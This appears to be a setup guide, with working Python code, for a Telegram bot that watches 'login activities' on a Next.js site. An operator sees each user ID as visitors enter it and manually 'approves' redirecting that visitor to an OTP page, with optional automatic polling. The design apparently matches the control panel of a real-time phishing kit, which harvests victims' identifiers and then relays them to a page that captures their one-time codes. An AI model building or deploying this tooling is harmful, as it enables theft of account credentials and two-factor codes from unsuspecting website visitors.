# Telegram Bot Setup Guide

## Step 1: Create Your Telegram Bot

1. Open Telegram and search for **@BotFather**
2. Start a chat with BotFather
3. Send `/newbot` command
4. Follow the prompts:
   - Choose a name for your bot (e.g., "My Login Monitor Bot")
   - Choose a username (must end with `bot`, e.g., "myloginmonitor_bot")
5. BotFather will give you a **Bot Token** - save this! It looks like:
   ```
   1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
   ```

## Step 2: Set Up Your Bot Code

Your bot needs to:
1. Monitor activities from your Next.js app
2. Send approval commands when you want to redirect users to OTP page

### Option A: Simple Python Bot Example

Create a file `telegram_bot.py`:

```python
import requests
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Replace with your bot token from BotFather
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"

# Replace with your Next.js app URL
APP_URL = "https://your-domain.com"  # or "http://localhost:3000" for local dev

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Bot activated!\n\n"
        "Commands:\n"
        "/activities - View recent activities\n"
        "/approve <activityId> - Approve and redirect to OTP\n"
        "/help - Show this help"
    )

async def get_activities(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        response = requests.get(f"{APP_URL}/api/activities")
        data = response.json()
        
        if data.get("success") and data.get("activities"):
            activities = data["activities"]
            if not activities:
                await update.message.reply_text("No activities found.")
                return
            
            # Show last 5 activities
            message = "📋 Recent Activities:\n\n"
            for activity in activities[-5:]:
                message += f"ID: {activity['id']}\n"
                message += f"Type: {activity['type']}\n"
                message += f"User: {activity.get('userId', 'N/A')}\n"
                message += f"Time: {activity.get('timestamp', 'N/A')}\n"
                message += f"/approve_{activity['id']}\n\n"
            
            await update.message.reply_text(message)
        else:
            await update.message.reply_text("No activities found.")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def approve_activity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /approve <activityId>")
        return
    
    activity_id = context.args[0]
    
    try:
        # Call your Next.js approve API
        response = requests.post(
            f"{APP_URL}/api/approve",
            json={
                "activityId": activity_id,
                "redirectType": "otp"  # Redirect to OTP page
            },
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code == 200:
            await update.message.reply_text(
                f"✅ Approved activity {activity_id}\n"
                f"User will be redirected to OTP page."
            )
        else:
            await update.message.reply_text(f"❌ Error: {response.status_code}")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query.data.startswith("approve_"):
        activity_id = query.data.replace("approve_", "")
        try:
            response = requests.post(
                f"{APP_URL}/api/approve",
                json={
                    "activityId": activity_id,
                    "redirectType": "otp"
                },
                headers={"Content-Type": "application/json"}
            )
            if response.status_code == 200:
                await query.answer("✅ Approved! User redirected to OTP.")
            else:
                await query.answer("❌ Error approving")
        except Exception as e:
            await query.answer(f"Error: {str(e)}")

def main():
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", start))
    application.add_handler(CommandHandler("activities", get_activities))
    application.add_handler(CommandHandler("approve", approve_activity))
    
    # Start bot
    print("🤖 Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
```

### Install Python Dependencies

```bash
pip install python-telegram-bot requests
```

### Run Your Bot

```bash
python telegram_bot.py
```

## Step 3: Test Your Bot

1. Open Telegram and search for your bot username
2. Start a chat and send `/start`
3. When a user enters their User ID on your website:
   - Send `/activities` to see the new activity
   - Send `/approve <activityId>` to approve and redirect to OTP page

## Step 4: Automated Monitoring (Optional)

To automatically monitor and approve activities, you can add polling:

```python
async def monitor_activities(context: ContextTypes.DEFAULT_TYPE):
    """Check for new activities every 5 seconds"""
    try:
        response = requests.get(f"{APP_URL}/api/activities")
        data = response.json()
        
        if data.get("success") and data.get("activities"):
            activities = data["activities"]
            # Process activities...
            # Auto-approve if needed
    except Exception as e:
        print(f"Monitoring error: {e}")

# Add to main():
from telegram.ext import CallbackContext
job_queue = application.job_queue
job_queue.run_repeating(monitor_activities, interval=5, first=1)
```

## API Endpoints Your Bot Will Use

1. **GET `/api/activities`** - Get all recent activities
   ```json
   {
     "success": true,
     "activities": [
       {
         "id": "12345",
         "type": "userid",
         "userId": "user@example.com",
         "timestamp": "2025-01-01T12:00:00Z"
       }
     ]
   }
   ```

2. **POST `/api/approve`** - Approve activity and redirect
   ```json
   {
     "activityId": "12345",
     "redirectType": "otp"
   }
   ```

## Quick Start Commands

- `/start` - Initialize bot
- `/activities` - View recent login activities
- `/approve <activityId>` - Approve and redirect user to OTP page

## Notes

- Replace `YOUR_BOT_TOKEN_HERE` with your actual bot token
- Replace `https://your-domain.com` with your actual Next.js app URL
- For local development, use `http://localhost:3000`
- The bot can run on any server or your local machine
- Make sure your Next.js app is accessible from where your bot runs

